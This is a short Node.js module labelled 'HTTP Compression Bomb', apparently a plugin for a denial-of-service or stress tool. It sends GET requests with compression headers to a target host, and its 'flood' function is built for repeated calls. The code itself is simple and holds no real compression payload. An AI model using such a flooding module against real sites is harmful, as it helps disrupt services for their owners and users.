const http = require('http');
const https = require('https');

module.exports = {
    name: 'HTTP Compression Bomb',
    description: 'Requests with compression headers',
    
    execute: async (target, port) => {
        const protocol = port === 443 ? https : http;
        
        return new Promise((resolve, reject) => {
            const req = protocol.request({
                hostname: target,
                port: port,
                path: '/',
                method: 'GET',
                headers: { 'Accept-Encoding': 'gzip, deflate, br' }
            }, (res) => {
                resolve({ status: res.statusCode, encoding: res.headers['content-encoding'] });
                req.destroy();
            });
            
            req.end();
            req.on('error', reject);
        });
    },
    
    flood: (target, port, callback) => {
        const protocol = port === 443 ? https : http;
        
        const req = protocol.request({
            hostname: target,
            port: port,
            path: '/',
            headers: { 'Accept-Encoding': 'gzip, deflate' }
        }, (res) => {
            res.resume();
            req.destroy();
            callback(true);
        });
        
        req.end();
        req.on('error', () => callback(false));
    }
};